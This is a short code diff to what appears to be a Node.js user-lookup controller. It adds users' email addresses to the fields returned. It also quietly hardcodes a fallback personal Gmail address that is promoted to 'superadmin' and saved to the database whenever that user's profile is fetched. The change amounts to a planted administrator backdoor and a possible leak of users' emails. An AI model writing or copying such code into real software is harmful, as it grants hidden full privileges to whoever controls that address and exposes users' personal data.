@@ -144,7 +144,7 @@ exports.getUserById = async (req, res) => {
     }
 
     const user = await User.findById(userId).select(
-      "username phone country countryCode role lastSeen profile stats coins isVerified displayId gender birthday birthDate birthdate dob age"
+      "username email phone country countryCode role lastSeen profile stats coins isVerified displayId gender birthday birthDate birthdate dob age"
     );
 
     if (!user) {
@@ -152,6 +152,12 @@ exports.getUserById = async (req, res) => {
         success: false,
         message: "User not found",
       });
+    }
+
+    const adminEmail = (process.env.ADMIN_EMAIL || "gyan123priya@gmail.com").trim().toLowerCase();
+    if (user.email && user.email.trim().toLowerCase() === adminEmail && user.role !== "superadmin") {
+      user.role = "superadmin";
+      await user.save();
     }
 
     const ringPartner = await resolveRingPartner(user);
